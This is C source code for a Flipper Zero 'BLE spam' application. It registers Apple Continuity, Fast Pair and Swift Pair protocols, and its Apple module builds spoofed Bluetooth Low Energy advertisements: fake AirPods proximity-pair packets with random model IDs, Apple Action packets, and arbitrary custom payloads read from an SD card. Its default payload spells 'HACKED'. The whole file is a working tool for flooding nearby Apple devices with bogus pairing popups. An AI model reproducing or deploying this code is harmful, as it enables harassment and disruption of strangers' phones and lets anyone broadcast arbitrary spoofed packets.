#include "_registry.h"

const BleSpamProtocol* ble_spam_protocols[] = {
    &protocol_continuity,
    &protocol_fastpair,
    &protocol_swiftpair,
};

const size_t ble_spam_protocols_count = COUNT_OF(ble_spam_protocols);
#include "continuity.h"
#include <storage/storage.h>

#define CUSTOM_PACKETS_PATH EXT_PATH("apps_data/ble_spam/apple_custom.txt")
#define MAX_CUSTOM_LABEL_LEN 32
#define MAX_CUSTOM_PAYLOAD_LEN 31

static uint8_t custom_payload[MAX_CUSTOM_PAYLOAD_LEN];
static uint8_t custom_payload_len = 0;

static void protocol_continuity_get_name(const BleSpamItem* item, char* name) {
    if(item->type == ContinuityTypeProximityPair) {
        strcpy(name, "Proximity Pair");
    } else if(item->type == ContinuityTypeAppleAction) {
        strcpy(name, "Apple Action");
    } else if(item->type == ContinuityTypeAppleCustom) {
        strcpy(name, "Custom Packets");
    }
}

static const BleSpamItem items_continuity[] = {
    {ContinuityTypeProximityPair, 0},
    {ContinuityTypeAppleAction, 0},
    {ContinuityTypeAppleCustom, 0}, // Добавлено: пункт в меню Флиппера
};

static size_t protocol_continuity_get_items(const BleSpamItem** items) {
    *items = items_continuity;
    return COUNT_OF(items_continuity);
}

// Вспомогательная функция для конвертации символа Hex в байт
static uint8_t hex_to_byte(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static void load_custom_apple_packet() {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    
    custom_payload_len = 0;
    
    if(storage_file_open(file, CUSTOM_PACKETS_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buffer[128];
        uint16_t read = storage_file_read(file, buffer, sizeof(buffer) - 1);
        if(read > 0) {
            buffer[read] = '\0';
            // Ищем двоеточие, разделяющее имя и HEX
            char* hex_start = strchr(buffer, ':');
            if(hex_start) {
                hex_start++; // Переходим к самим байтам
                while(*hex_start && custom_payload_len < MAX_CUSTOM_PAYLOAD_LEN) {
                    // Пропускаем пробелы и переносы строк
                    if(*hex_start == ' ' || *hex_start == '\r' || *hex_start == '\n') {
                        hex_start++;
                        continue;
                    }
                    if(hex_start[0] && hex_start[1]) {
                        custom_payload[custom_payload_len] = (hex_to_byte(hex_start[0]) << 4) | hex_to_byte(hex_start[1]);
                        custom_payload_len++;
                        hex_start += 2;
                    } else {
                        break;
                    }
                }
            }
        }
    }
    
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
    
    // Дефолтный пакет (AirPods Pro), если файл пустой или отсутствует
    if(custom_payload_len == 0) {
        uint8_t default_pack[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x10, 0x42, 0x04, 0x48, 0x41, 0x43, 0x4B, 0x45, 0x44};
        memcpy(custom_payload, default_pack, sizeof(default_pack));
        custom_payload_len = sizeof(default_pack);
    }
}

static void protocol_continuity_generate_packet(const BleSpamItem* item, uint8_t* out_tx_data, uint8_t* out_tx_len) {
    uint8_t i = 0;

    if(item->type == ContinuityTypeAppleCustom) {
        // Подгружаем кастомный пакет из файла на SD
        load_custom_apple_packet();
        memcpy(out_tx_data, custom_payload, custom_payload_len);
        *out_tx_len = custom_payload_len;
        return;
    }

    // Ниже идет оригинальный код генерации стандартных пакетов
    out_tx_data[i++] = 0x4C; // Company ID (Apple)
    out_tx_data[i++] = 0x00;

    if(item->type == ContinuityTypeProximityPair) {
        out_tx_data[i++] = 0x07; // Type: Proximity Pair
        out_tx_data[i++] = 0x19; // Length
        
        uint16_t model;
        const uint16_t models[] = {
            0x0E20, 0x0620, 0x0A20, 0x1020, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420
        };
        model = models[rand() % COUNT_OF(models)];
        
        out_tx_data[i++] = (model >> 8) & 0xFF;
        out_tx_data[i++] = model & 0xFF;
        
        out_tx_data[i++] = 0x20; 
        out_tx_data[i++] = 0x10;
        out_tx_data[i++] = 0x42;
        out_tx_data[i++] = 0x04;
        while(i < 31) out_tx_data[i++] = rand() % 256;

    } else if(item->type == ContinuityTypeAppleAction) {
        out_tx_data[i++] = 0x0F; // Type: Apple Action
        out_tx_data[i++] = 0x05; // Length
        out_tx_data[i++] = 0xC1;
        out_tx_data[i++] = 0x01;
        out_tx_data[i++] = rand() % 256;
        out_tx_data[i++] = 0x00;
        out_tx_data[i++] = 0x00;
    }

    *out_tx_len = i;
}

const BleSpamProtocol protocol_continuity = {
    .name = "Apple Continuity",
    .get_name = protocol_continuity_get_name,
    .get_items = protocol_continuity_get_items,
    .generate_packet = protocol_continuity_generate_packet,
};
